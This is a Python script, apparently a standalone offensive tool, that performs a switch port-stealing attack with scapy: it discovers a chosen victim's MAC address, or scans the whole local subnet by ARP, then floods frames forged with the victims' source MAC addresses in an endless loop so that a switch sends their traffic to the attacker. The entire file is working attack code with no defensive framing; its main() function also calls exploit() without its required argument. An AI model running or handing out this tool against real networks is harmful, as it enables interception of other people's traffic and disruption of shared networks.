#!/usr/bin/env python3

from scapy.arch import get_if_addr, get_if_list
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp, srp1
from scapy.base_classes import Net
from scapy.layers.l2 import conf

import argparse
import asyncio
import netifaces


class ArgumentParser:

    def __init__(self) -> None:
        """
        Parse arguments (argv).
        """
        # Parser
        self._parser = argparse.ArgumentParser()
        # Src Mac Address
        self._parser.add_argument("--interface", "-i", help="Local interface to communicate with targets", required=False, type=str, default=get_if_list()[1], choices=get_if_list())
        # Src Ip Address to spoof
        self._parser.add_argument("--spoof", "-s", help="Victim to steal the port from, if not provided try to spoof all the network", required=False, type=str, default="0.0.0.0")
        # Args
        self._args = self._parser.parse_args()

        # Each arguments
        self.interface = self._args.interface
        self.spoof_ip = self._args.spoof


class PortStealing(ArgumentParser):

    ARP_BROADCAST = "ff:ff:ff:ff:ff:ff"
    ARP_DST = "13:37:de:ad:ba:be"
    IP_NULL = "0.0.0.0"
    MAC_NULL = "00:00:00:00:00:00"

    def __init__(self) -> None:
        """
        ARP Spoofing attack
        """
        # Arguments
        super().__init__()

        # Get local information
        self.ipv4, self.interface = self.getLocalInterface(self.interface)
        print(f"[+] Local information: IP:{self.ipv4}, if:{self.interface}")

        # Log spoof information
        if self.spoof_ip == self.IP_NULL:
            print(f"[+] No spoof provided try to steal all the network {self.ipv4}/{self.getInterfaceMask(self.interface)}")
            self.spoof_hwmac = self.getNetworkMac()
        else:
            self.spoof_hwmac = [self.getRemoteMac(self.spoof_ip)]
            print(f"[+] Host to Spoof: {self.spoof_ip}, MAC: {self.spoof_hwmac}")

        # Steal port now
        while True:
            self.exploit(self.spoof_hwmac)


    def getLocalInterface(self, interface: str) -> tuple:
        """
        Get current interface.
        :returns (tuple)((str)`ip`, (str)`interface`)
        """
        if get_if_addr(interface) == "0.0.0.0":
            interface = conf.iface
            return self.getLocalInterface(interface)
        return get_if_addr(interface), interface


    def getInterfaceMask(self, interface: str) -> str:
        """
        Get the mask for the `interface`.
        `interface`: str, interface to get the mask from.
        :returns (str)`mask`
        """
        netmask = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]["netmask"]
        return sum(bin(int(x)).count('1') for x in netmask.split('.'))


    def getNetworkMac(self) -> list:
        """
        Launch an who-as to get all @MAC of each host in the network.
        :returns (list)`mac`(str)
        """
        mask = self.getInterfaceMask(self.interface)
        mac = list()
        for index, ip in enumerate(Net(f"{self.ipv4}/{mask}")):
            print(f"[+] Done {index}/{pow(2, 32 - mask)}", end="\r")
            try:
                macForCurrentIp = self.getRemoteMac(ip)
                mac.append(macForCurrentIp)
            except AttributeError:
                continue

        print()
        return mac


    def getRemoteMac(self, ip: str) -> str:
        """
        Launch an who-as to get @MAC from the @IP.
        `ip`: str, IP to get the corresponding MAC.
        :returns (str)`mac`
        """
        res = srp1(Ether(dst=self.ARP_BROADCAST) / ARP(op=0x1, pdst=ip), iface=self.interface, timeout=1, verbose=0)
        return res.payload.hwsrc


    def exploit(self, macs: list) -> None:
        """
        Spoof the victim.
        """
        # For each host send the request
        for mac in macs:
            # Create the ARP request (Request)
            req_arp = Ether(dst=self.ARP_DST, src=mac)/ARP(psrc=self.IP_NULL, hwsrc=self.MAC_NULL, pdst=self.IP_NULL, hwdst=self.MAC_NULL, op=0x1)
            sendp(req_arp, iface=self.interface, verbose=False)


def main(portStealing: PortStealing):
    # Thread asyncio
    loop = asyncio.get_event_loop()

    # Spoof
    loop.run_until_complete(portStealing.exploit())
    loop.close()


if __name__ == "__main__":
    portStealing = PortStealing()
    try:
        main(portStealing)
    except KeyboardInterrupt:
        exit(0)
    except PermissionError:
        print("[!] You need to be root to launch the script OR have the net capabilities !")
        exit(0)
